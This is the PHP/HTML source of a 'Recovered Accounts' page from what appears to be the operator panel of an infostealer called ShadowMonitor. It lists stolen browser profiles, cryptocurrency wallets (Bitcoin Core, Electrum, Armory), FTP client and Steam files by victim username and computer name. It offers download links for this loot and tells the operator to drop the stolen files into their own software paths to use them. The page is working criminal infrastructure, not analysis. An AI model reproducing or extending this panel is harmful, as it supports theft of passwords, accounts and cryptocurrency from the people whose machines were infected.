<?php
include 'include/panelSession.php';
include 'include/dbinfo.php';
?>
<html>
<head>
<link rel = "icon" type = "image/png" href = "images/favicon.png"/>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">

<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta name="description" content="ShadowMonitor Web Panel" />
<meta name="author" content="" />

<title>ShadowMonitor Web Panel</title>

	<!-- Global stylesheets -->
	<link href="https://fonts.googleapis.com/css?family=Roboto:400,300,100,500,700,900" rel="stylesheet" type="text/css">
	<link href="assets/css/icons/icomoon/styles.css" rel="stylesheet" type="text/css">
	<link href="assets/css/icons/fontawesome/styles.min.css" rel="stylesheet" type="text/css">
	<link href="assets/css/bootstrap.css" rel="stylesheet" type="text/css">
	<link href="assets/css/core.css" rel="stylesheet" type="text/css">
	<link href="assets/css/components.css" rel="stylesheet" type="text/css">
	<link href="assets/css/colors.css" rel="stylesheet" type="text/css">
	<!-- /global stylesheets -->

	<!-- Core JS files -->
	<script type="text/javascript" src="assets/js/plugins/notifications/sweet_alert.min.js"></script>
	<script type="text/javascript" src="assets/js/plugins/loaders/pace.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.2/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.11.4/jquery-ui.min.js"></script>

	<script type="text/javascript" src="assets/js/core/libraries/bootstrap.min.js"></script>
	<script type="text/javascript" src="assets/js/plugins/loaders/blockui.min.js"></script>
	<!-- /core JS files -->

	<!-- Theme JS files -->
	<!--Responsive datatables-->
	<script type="text/javascript" src="assets/js/plugins/tables/datatables/datatables.min.js"></script>
	<script type="text/javascript" src="assets/js/plugins/tables/datatables/extensions/responsive.min.js"></script>
	<script type="text/javascript" src="assets/js/plugins/forms/selects/select2.min.js"></script>
	<!--Switchery-->
	<script type="text/javascript" src="assets/js/plugins/forms/styling/uniform.min.js"></script>
	<script type="text/javascript" src="assets/js/plugins/forms/styling/switchery.min.js"></script>
	<script type="text/javascript" src="assets/js/plugins/forms/styling/switch.min.js"></script>
	
	<!-- Theme JS files -->
	<script type="text/javascript" src="assets/js/core/app.js"></script>
	<script type="text/javascript" src="assets/js/pages/datatables_responsive.js"></script>
	<script type="text/javascript" src="assets/js/pages/components_popups.js"></script>
	<script type="text/javascript" src="assets/js/plugins/forms/validation/validate.min.js"></script>
	<script type="text/javascript" src="assets/js/plugins/forms/selects/bootstrap_multiselect.js"></script>
	<script type="text/javascript" src="assets/js/plugins/forms/inputs/touchspin.min.js"></script>
	<script type="text/javascript" src="assets/js/pages/form_validation.js"></script>

	<!--/ theme js files-->

<!--Date picker-->
	<script type="text/javascript" src="assets/js/plugins/ui/moment/moment.min.js"></script>
	<script type="text/javascript" src="assets/js/plugins/pickers/daterangepicker.js"></script>
	<script type="text/javascript" src="assets/js/plugins/pickers/anytime.min.js"></script>
	<script type="text/javascript" src="assets/js/plugins/pickers/pickadate/picker.js"></script>
	<script type="text/javascript" src="assets/js/plugins/pickers/pickadate/picker.date.js"></script>
	<script type="text/javascript" src="assets/js/plugins/pickers/pickadate/picker.time.js"></script>
	<script type="text/javascript" src="assets/js/plugins/pickers/pickadate/legacy.js"></script>
	<script type="text/javascript" src="assets/js/pages/picker_date.js"></script>

	<!--Custom styles-->
	<link rel = "stylesheet" type = "text/css" href = "style/custom.css">

		<!--Custom Scripts-->
<script src = "js/InitiateSwitchery.js"></script>
</head>

<body>

<!-- Page container -->
<div class="page-container">

<!-- Page content -->
<div class="page-content">

<?php include 'navigation/sidebar.php'; ?>

<script>
$("#passRecoveries").addClass('active');
</script>

<!-- Main content -->
<div class="content-wrapper">

<!-- Content area -->
<div class="content">
<?php include 'accountManager.php'; ?>

<!--Recovery Viewer begin-->
<div id="RecoveryViewer" class="modal fade">
<div class="modal-dialog modal-full">
<div class="modal-content">
<div class="modal-header">
<button type="button" class="close" data-dismiss="modal">&times;</button>
<h5 class="modal-title">Client: <span id = "recoveryViewTarget"></span>/Logged At: <span id = "recoveryViewLogDate"></span>/<span id = "totalFiles"></span> files in total</h5>
</div>

<div class="modal-body" id = "recoveryFiles">
</div>

<div class="modal-footer">
</div>
</div>
</div>
</div>
<!--Recovery viewer end-->

<?php
$clientId = "";
if (isset($_GET['clientId'])) {
$clientId = $_GET['clientId'];
}

function RecoveryIcon($recovery) {
switch ($recovery) {
case "Chrome":
return "chrome.png";
break;
case "Firefox":
return "firefox.png";
break;
case "Opera":
return "opera.png";
break;
case "Safari":
return "safari.png";
break;
case "Dragon":
return "dragon.png";
break;
case "Maxthon":
return "maxthon.png";
break;
case "Icon":
return "iron.png";
break;
case "Orbitum":
return "orbitum.png";
break;
case "Maelstrom":
return "maelstrom.png";
break;
case "Torch":
return "torch.png";
break;
case "Litecoin":
return "litecoin.png";
break;
case "Core":
return "bitcoinCore.png";
break;
case "Multibit":
return "multibit.png";
break;
case "Armory":
return "armory.png";
break;
case "Electrum":
return "electrum.png";
break;
case "Filezilla":
return "filezilla.png";
break;
case "CuteFTP";
return "cuteFtp.png";
break;
case "SmartFTP":
return "smartFtp.png";
break;
case "Steam":
return "steam.png";
case "Minecraft":
return "minecraft.png";
break;
}
}

?>

<!--Client Id(if any)-->
<input type = "hidden" value = "<?php echo $clientId; ?>" id = "clientId">

<!--Logs-->
<div class = "panel panel-flat">
<div class = "panel-heading">
<center>
<div class = "panel-title">Recovered Accounts</div>
<div class = "infoText">
<i class = 'icon-info22'></i> <span>All the recovered files are <b>encrypted</b>. To view the content, please <b>replace</b> them with yours according to their corresponding software <b>path</b> as shown below.</span>
</div>
</center>
<div class = "panel-body">
<table class = "table datatable-responsive" id = "recoveryTbl">
<!--Date picker begin-->
<div class="form-group col-lg-offset-2" style = "position: relative; top:56px;">
<div class = "col-lg-3">
<div class="input-group">
<span class="input-group-addon"><i class="icon-calendar22"></i></span>
<input type="text" class="form-control daterange-basic" id = "dateFilter" value="<?php echo date('m-d-y'); ?>"> 
<!--01/01/2015 - 01/31/2015-->
</div>
</div>
</div>
<!--Date picker end-->
<thead>
<tr>
<td>Software</td>
<td>Path</td>
<td>Username</td>
<td>Computer</td>
<td>Log Date</td>
<td>Action</td>
</tr>
</thead>
<tbody id = "recoveryHolder">
<?php
if (isset($_GET['clientId'])) {
$sql = "SELECT clientTbl.username, clientTbl.pcname, clientTbl.id clientId,
recoveryTbl.id, recoveryTbl.clientId recoveryClientId, recoveryTbl.name, recoveryTbl.path, recoveryTbl.files, recoveryTbl.logDate From clients clientTbl
inner join recoveries recoveryTbl on (clientTbl.id = recoveryTbl.clientId) Where clientTbl.id = :clientId";
$recoveries = $server->prepare($sql);
$recoveries->bindParam(":clientId", $clientId, PDO::PARAM_STR);
$recoveries->execute();
} else {
$sql = "SELECT clientTbl.username, clientTbl.pcname, clientTbl.id clientId,
recoveryTbl.id, recoveryTbl.clientId recoveryClientId, recoveryTbl.name, recoveryTbl.path, recoveryTbl.files, recoveryTbl.logDate From clients clientTbl
inner join recoveries recoveryTbl on (clientTbl.id = recoveryTbl.clientId)";
$recoveries = $server->query($sql);
}
while ($recovery = $recoveries->fetch(PDO::FETCH_ASSOC)) {
?>
<tr id = "recovery<?php echo $recovery['id']; ?>" data-screenshot = "<?php echo $recovery['screenshotName']; ?>">
<!--Software-->
<td>
<img src = "images/recovery/<?php echo RecoveryIcon($recovery['name']); ?>"><br>
<?php echo $recovery['name']; ?>
</td>
<!--Path-->
<td>
<?php echo $recovery['path']; ?>
</td>
<!--Username-->
<td>
<span class = "clientName"><?php echo $recovery['username']; ?></span>
</td>
<!--Computer-->
<td>
<span class = "pcName"><?php echo $recovery['pcname']; ?></span>
</td>
<!--Log Date-->
<td>
<span class = "logDate"><?php echo $recovery['logDate']; ?></span>
</td>
<!--Action-->
<td>
<a class = "actionBtn" data-popup = "tooltip" data-placement = "top" title = "Inspect" type = "button" onClick = "ViewRecovered($(this));" data-recoveryId = "<?php echo $recovery['id']; ?>">
<img width ="30" height = "30" src = "images/actions/view.png">
</a>
<i data-popup = "tooltip" data-placement = "top" title = "Delete" class = "fa fa-remove actionIcon" onClick = "DeleteRecovery($(this));" data-recoveryId = "<?php echo $recovery['id']; ?>"></i>
</td>
</tr>
<?php } ?>
</tbody>
</table>
</div>
</div>
</div>

</div>
<!--/content area end-->
</div>
<!--/content wrapper end-->
</div>
<!--/page content end-->
</div>
<!--/page container end-->

<script>
//Delete log
function DeleteRecovery(recovery) {
swal({
type: "warning",
html: true,
title: "Warning",
text: "The recovery log with all of its <b>files</b> will be <b>deleted</b>. Please make sure that you've <b>downloaded</b> all the recovered files!",
showCancelButton: true,
cancelButtonText: "Cancel",
showConfirmButton: true,
confirmButtonText: "Proceed"},
function (confirmed) {
if (confirmed) {
var rowElement = $("#recovery" + $(log).attr('data-recoveryId'));
$.ajax({
type: "POST",
data: {
cmd: "delete",
id: $(recovery).attr('data-recoveryId'),
},
url: "cms/Recovery.php",
cache: false,
success: function() {
$(rowElement).effect('highlight', {color: "#263238"});
$.when($(rowElement)).done(function() { 
recoveryTbl.row($(rowElement)).remove().draw();
});
}
});
}
});
}

function ViewRecovered(software) {
var recoveryElement = $("#recovery" + $(software).attr('data-recoveryId'));
$.ajax({
type: "POST",
data: {cmd: "inspect", id: $(software).attr('data-recoveryId')},
cache: false,
url: "cms/Recovery.php",
success: function(recovery) {
recovery = recovery.split("recoverySpl");
var recoveryData = {
"totalFiles": recovery[0],
"recoveryFile": recovery[1],
"files": recovery[2]
};
var files = recoveryData['files'].split("fileSpl");
var profiles = "";
$("#recoveryViewTarget").text($(recoveryElement).find('.clientName').text());
$("#recoveryViewLogDate").text($(recoveryElement).find('.logDate').text());
$("#totalFiles").text(recoveryData['totalFiles']);
$("#recoveryFiles").empty();
for (i = 0; i < files.length -1; i++) {
profiles = files[i].split("profSpl");
$("#recoveryFiles").append(
"<div class = 'col-lg-3'>" +
"<div class = 'panel panel-info'>" +
"<div class = 'panel-heading'>" +
"<div class = 'panel-title'>" +
profiles[0] + "\\" + recoveryData['recoveryFile'] +
"</div>" +
"</div>" +
"<div class = 'panel-body'>" +
profiles[1] +
"<div style = 'float:right'>" +
"<a href = 'functions/downloadRecovery.php?recovery=" + profiles[1] + "&pcname=" + $(recoveryElement).find('.pcName').text() + "' class = 'actionBtn'>" +
"<i class = 'icon-cloud-download2 actionIcon downloadRecovery' data-toggle = 'tooltip' data-placement = 'top' title = 'Download!'></i>" +
"</a>" +
"</div>" +
"</div>" +
"</div>" +
"</div>"
);
}
$(".actionIcon[data-toggle='tooltip']").tooltip();
$("#RecoveryViewer").modal('show');
}
});
}

$(document).ready(function() {
//Initialize switchery
InitiateSwitcheries(".switchery");

//Initialize bootstrap tooltip
$("[data-toggle='tooltip']").tooltip();

//Get client id(if any)
var clientId = $("#clientId").val();

//Log datatable initialization begin
recoveryTbl = $("#recoveryTbl").DataTable({
"columnDefs": [{
targets: [4]
}],
"paging": true,
"ordering": true,
"info": true,
stateSave: true
});
//Log datatable initialization end

//Date picker begin
$(document).on('click', ".applyBtn", function() {
var dateFilter = $("#dateFilter").val().split(" - ");
$.ajax({
type: "POST",
data: {
cmd: "filterLogs",
clientId: clientId,
startDate: dateFilter[0],
endDate: dateFilter[1]
},
cache: false,
url: "cms/Recovery.php",
success: function(recoveries) {
if (recoveries !== "") {
recoveryTbl.clear().draw();
for (i = 0; i < $(recoveries).length; i++) {
recoveryTbl.row.add($(recoveries)[i]).draw();
}
}
}
});
});
//Date picker end

//Download screenshot
$("#dlScreenshot").click(function() {
var screenshotPath = $("#logScreenshot").attr('src');
var screenshotName = screenshotPath.substring(screenshotPath.lastIndexOf("/") +1);
window.location = "http://shadowmonitor.dev/functions/downloadScreenshot.php?screenshot=" + screenshotPath;
//alert("http://shadowmonitor.dev/images/screenshots/" + $("#logScreenshot").attr('src'));
});

});
</script>

<!--Required-->
<script src = "js/datatables/InitiatePaging.js"></script>
<script src = "js/datatables/InitiateFiltering.js"></script>
</body>
</html>